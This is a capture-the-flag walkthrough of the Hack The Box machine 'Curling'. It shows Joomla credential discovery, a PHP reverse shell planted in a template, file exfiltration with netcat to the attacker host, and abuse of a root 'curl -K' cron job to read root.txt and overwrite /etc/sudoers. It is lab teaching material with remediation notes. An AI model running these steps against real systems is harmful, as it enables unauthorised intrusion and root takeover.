# Curling

```
kali@kali:~/htb/Curling$ sudo nmap -sC -sV 10.129.92.218 
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-05 18:03 EST
Nmap scan report for 10.129.92.218
Host is up (0.029s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.07 seconds
kali@kali:~/htb/Curling$ 
```

The website is a blog page about curling named "Cewl Curling site!". We see one username: "Super User" with a couple of blog posts. As well as a login form, with a forgot password/username link.

I run a fuzz:

```
kali@kali:~/htb/Curling$ sudo wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.129.92.218/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.0.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.92.218/FUZZ
Total requests: 220560

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                    
===================================================================

000000003:   200        361 L    1051 W   14241 Ch    "# Copyright 2007 James Fisher"                                            
000000001:   200        361 L    1051 W   14241 Ch    "# directory-list-2.3-medium.txt"                                          
000000007:   200        361 L    1051 W   14241 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"          
000000016:   200        1 L      2 W      31 Ch       "images"                                                                   
000000009:   200        361 L    1051 W   14241 Ch    "# Suite 300, San Francisco, California, 94105, USA."                      
000000013:   200        361 L    1051 W   14241 Ch    "#"                                                                        
000000011:   200        361 L    1051 W   14241 Ch    "# Priority ordered case sensative list, where entries were found"         
000000010:   200        361 L    1051 W   14241 Ch    "#"                                                                        
000000006:   200        361 L    1051 W   14241 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"            
000000005:   200        361 L    1051 W   14241 Ch    "# This work is licensed under the Creative Commons"                       
000000008:   200        361 L    1051 W   14241 Ch    "# or send a letter to Creative Commons, 171 Second Street,"               
000000002:   200        361 L    1051 W   14241 Ch    "#"                                                                        
000000014:   200        361 L    1051 W   14241 Ch    "http://10.129.92.218/"                                                    
000000012:   200        361 L    1051 W   14241 Ch    "# on atleast 2 different hosts"                                           
000000004:   200        361 L    1051 W   14241 Ch    "#"                                                                        
000000081:   200        1 L      2 W      31 Ch       "templates"                                                                
000000080:   200        1 L      2 W      31 Ch       "media"                                                                    
000000145:   200        1 L      2 W      31 Ch       "modules"                                                                  
000000483:   200        1 L      2 W      31 Ch       "bin"                                                                      
000000519:   200        1 L      2 W      31 Ch       "plugins"                                                                  
000000638:   200        1 L      2 W      31 Ch       "includes"                                                                 
000000870:   200        1 L      2 W      31 Ch       "language"                                                                 
000001005:   200        1 L      2 W      31 Ch       "components"                                                               
000001083:   200        1 L      2 W      31 Ch       "cache"                                                                    
000001249:   200        1 L      2 W      31 Ch       "libraries"                                                                
000003237:   200        1 L      2 W      31 Ch       "tmp"                                                                      
000003547:   200        1 L      2 W      31 Ch       "layouts"                                                                  
000005689:   200        109 L    348 W    5113 Ch     "administrator"                                                            
000020684:   200        1 L      2 W      31 Ch       "cli"                                                                      
000045240:   200        361 L    1051 W   14241 Ch    "http://10.129.92.218/"                                                    
000095524:   403        11 L     32 W     301 Ch      "server-status"                                                            

Total time: 676.1025
Processed Requests: 220560
Filtered Requests: 220529
Requests/sec.: 326.2227
```

http://10.129.92.218/administrator/ seems to be the same login form. it is a Joomla! powered webserver.

We also have the hint of cewl. 

So let's try cewling:

```
kali@kali:~/htb/Curling$ cewl -d 5 -m 5 -w cewl.txt http://10.129.92.218
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
kali@kali:~/htb/Curling$ cat cewl.txt | wc -l
123
```

We go depth 5, and minimum length 5, write to cewl.txt.


I look over the wlist quick, and see "secret". So I try secret.txt

This is a page with "Q3VybGluZzIwMTgh"

Looks like it could be Base64, so let's decode it:

```
kali@kali:~/htb/Curling$ echo "Q3VybGluZzIwMTgh" | base64 -d && echo
Curling2018!
```

Looks like a possible password. I try with admin/administrator/Super User etc. but nothing works. So I check the blog content again and have the obvious answer:

```
Hey this is the first post on this amazing website! Stay tuned for more amazing content! curling2018 for the win!

- Floris
```


Floris:Curling2018! works.


I head over to the admin panel to look for file upload so we can get reverse shell. If we don't see any obvious methods, we can get the Joomla! version and check searchsploit.

I go to help->Joomla! Help, to get the version 3.8.8

I check the templates and see that I can edit the php files directly.

I simply add a nishang php reverse shell at the top of the index page, and start my listener. Then I refresh the home page.


```
kali@kali:~/htb/Curling$ sudo nc -nlvp 1337
[sudo] password for kali: 
Listening on 0.0.0.0 1337
Connection received on 10.129.92.218 34628
Linux curling 4.15.0-22-generic #24-Ubuntu SMP Wed May 16 12:15:17 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 00:36:51 up  3:00,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
``` 

I elevate the shell with `script /dev/null -c bash`. Then ctrl+Z to put that in the background. `stty raw -echo`, `fg` to bring it back to the foreground, `reset` and `xterm` to get a tty shell. After this i `export TERM=xterm` and `export SHELL=bash` to finalize the escalation.


I make my way to floris' home directory and find some interesting files. The admin-area directory, and password_backup.

```
www-data@curling:/home/floris$ ls -la
total 44
drwxr-xr-x 6 floris floris 4096 May 22  2018 .
drwxr-xr-x 3 root   root   4096 May 22  2018 ..
lrwxrwxrwx 1 root   root      9 May 22  2018 .bash_history -> /dev/null
-rw-r--r-- 1 floris floris  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 floris floris 3771 Apr  4  2018 .bashrc
drwx------ 2 floris floris 4096 May 22  2018 .cache
drwx------ 3 floris floris 4096 May 22  2018 .gnupg
drwxrwxr-x 3 floris floris 4096 May 22  2018 .local
-rw-r--r-- 1 floris floris  807 Apr  4  2018 .profile
drwxr-x--- 2 root   floris 4096 May 22  2018 admin-area
-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup
-rw-r----- 1 floris floris   33 May 22  2018 user.txt
www-data@curling:/home/floris$  
```

password_backup seems to be a xxd dump:

```
www-data@curling:/home/floris$ cat password_backup 
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
www-data@curling:/home/floris$ 
```

I google the start of the file "BZh91AY&SY" and discover that it's probably the header for bz2 files.

```
kali@kali:~/htb/Curling$ cat pass_back | xxd -r > pass_zip
kali@kali:~/htb/Curling$ 7z x pass_zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 9 3900X 12-Core Processor             (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 244 bytes (1 KiB)

Extracting archive: pass_zip
--
Path = pass_zip
Type = bzip2

Everything is Ok

Size:       173
Compressed: 244
kali@kali:~/htb/Curling$ ls -la
total 150696
drwxr-xr-x  2 kali kali      4096 Feb  5 19:50 .
drwxr-xr-x 28 kali kali      4096 Feb  5 18:03 ..
-rw-r--r--  1 kali kali       944 Feb  5 18:58 cewl.txt
-rw-r--r--  1 root root 154276142 Feb  5 18:36 hydra.restore
-rw-r--r--  1 root root      1077 Feb  5 19:45 pass_back
-rw-r--r--  1 kali kali       244 Feb  5 19:50 pass_zip
-rw-r--r--  1 kali kali       173 Feb  5 19:50 pass_zip~
-rwxr-xr-x  1 kali kali      5493 Feb  5 19:35 php-reverse-shell.php
kali@kali:~/htb/Curling$ cat pass_zip~
�l[password�r�BZh91AY&SY6Ǎ����@@!PtD�� t"d�hhOPIS@��6��8ET>P@�#I bՃ|3��x���������(*N�&�H��k1��x��"�{��ೱ��]��B@�6�m��kali@kali:~/htb/Curling$ 
kali@kali:~/htb/Curling$ file pass_zip~
pass_zip~: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141
kali@kali:~/htb/Curling$ 7z x pass_zip~ 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 9 3900X 12-Core Processor             (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 173 bytes (1 KiB)

Extracting archive: pass_zip~
--
Path = pass_zip~
Type = gzip
Headers Size = 19

Everything is Ok

Size:       141
Compressed: 173
kali@kali:~/htb/Curling$ file password
password: bzip2 compressed data, block size = 900k
kali@kali:~/htb/Curling$ 7z x password

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 9 3900X 12-Core Processor             (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 141 bytes (1 KiB)

Extracting archive: password
--
Path = password
Type = bzip2

Everything is Ok

Size:       10240
Compressed: 141
kali@kali:~/htb/Curling$ file password~
password~: POSIX tar archive (GNU)
kali@kali:~/htb/Curling$ 7z x password~

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 9 3900X 12-Core Processor             (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10240 bytes (10 KiB)

Extracting archive: password~
--
Path = password~
Type = tar
Physical Size = 10240
Headers Size = 9728
Code Page = UTF-8

Everything is Ok

Size:       19
Compressed: 10240
kali@kali:~/htb/Curling$ ls
cewl.txt  hydra.restore  pass_back  password  password~  password.txt  pass_zip  pass_zip~  php-reverse-shell.php
kali@kali:~/htb/Curling$ cat password.txt
5d<wdCbdZu)|hChXll
```
What a compression nightmare. We finally decompress down to a text file eventually.

Now we have the password(hopefully), so let's try it:

```
www-data@curling:/home/floris$ su -l floris
Password: 
floris@curling:~$ whoami
floris
floris@curling:~/admin-area$ sudo -l
[sudo] password for floris: 
Sorry, user floris may not run sudo on curling.
floris@curling:~/admin-area$ id
uid=1000(floris) gid=1004(floris) groups=1004(floris)

```

Now we can check out the admin area:

```
floris@curling:~$ cd admin-area/
floris@curling:~/admin-area$ ls
input  report
floris@curling:~/admin-area$ ls -la
total 16
drwxr-x--- 2 root   floris 4096 May 22  2018 .
drwxr-xr-x 6 floris floris 4096 May 22  2018 ..
-rw-rw---- 1 root   floris   25 Feb  6 00:57 input
-rw-rw---- 1 root   floris   94 Feb  6 00:57 report
floris@curling:~/admin-area$ cat input
url = "http://127.0.0.1"
floris@curling:~/admin-area$ cat report
WARNING: Failed to daemonise.  This is quite common and not fatal.
Connection timed out (110)
```


I upload LinEnum with `sudo python -m SimpleHTTPServer` and `wget 10.10.14.70:8000/LinEnum.sh`.


```
floris@curling:~$ chmod 777 LinEnum.sh
floris@curling:~$ ./LinEnum.sh > enum.txt
floris@curling:~$ nc 10.10.14.70 1440 < enum.txt
```

And recieve the file with: `sudo nc -nlvp 1440 > enum.txt`

Under "Running Processes" I see this:

"root      5700  0.0  0.0   4628   856 ?        Ss   00:37   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report"

And it happens multiple times.

So what does this command do?

by running `man curl` (manual for the curl program) we find this:

```
 -K, --config <file>

              Specify a text file to read curl arguments from. The command line arguments found in the text file will be used as if they
              were provided on the command line
```


So root is running a command to run curl (commands from input file) and outputting it to report.

So we can essentially change input to whatever we want, and root will run it for us, let's try:

I googled curl exploits/privesc a bit, and found this: https://gtfobins.github.io/gtfobins/curl/ 

The file reading makes sense. It's like when you read a local pdf file in the browser. 

We can just input whatever system file we want after file://

here, I am doing `url = "file:///root/root.txt"`

This should just result in the root file being output into the report.

I save the file, and wait for report to change:

```
floris@curling:~/admin-area$ cat report
WARNING: Failed to daemonise.  This is quite common and not fatal.
Connection timed out (110)
floris@curling:~/admin-area$ cat report
82c198ab6fc53xxxxxxxxxxxxxxxxxxx
```

So this completes the box. But what if we want to get root?

I change the url to: `url = "file:///etc/sudoers"`

And I then get this:

```
floris@curling:~/admin-area$ cat report
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
floris@curling:~/admin-area$ 
```

I then change this to give user "floris" sudo nopasswd permissions:


```
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

floris  ALL=(ALL) NOPASSWD:ALL

#includedir /etc/sudoers.d
```

I start up the server:

```
kali@kali:~/htb/Curling$ sudo python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...
```

And then try to upload the new sudoers file in input:

```
url = "http://10.10.14.70:8000/sudoers" 
output = "/etc/sudoers"
```

I wait for the server to get a GET request:

```
kali@kali:~/htb/Curling$ sudo python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...
10.129.92.218 - - [05/Feb/2021 21:13:36] "GET /sudoers HTTP/1.1" 200 -
```

hopefully, the sudoers file on the target machine should be overwritten:

```
floris@curling:~/admin-area$ sudo -l
Matching Defaults entries for floris on curling:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User floris may run the following commands on curling:
    (ALL) NOPASSWD: ALL
floris@curling:~/admin-area$ sudo /bin/bash -p
root@curling:~/admin-area# whoami
root
root@curling:~/admin-area# 
```


## Comparing myself to the official writeup:

They find the secret.txt hint in the source code of the index site. 

They get a reverse shell with the template php code.


They find the password_backup file. And get the password by decompressing with bzip2, gzip, and tar.

They use pspy to enumerate running crons. And find the curl command.

They create a malicious crontab to connect back via netcat, and recieve root.


## How to stop this exploit:

In this case, all the software was running on fairly recent patches. I believe an exploit has been found now. But at the time of the boxes release, it was not known. So the errors here are users leaving passwords out. Even if they are obfuscated slightly. 

The running cron tab was also a pretty large mistake. I think the report can be accessble for floris fine. But the input is essentially run as root, and therefore should not be writeable by non-root users.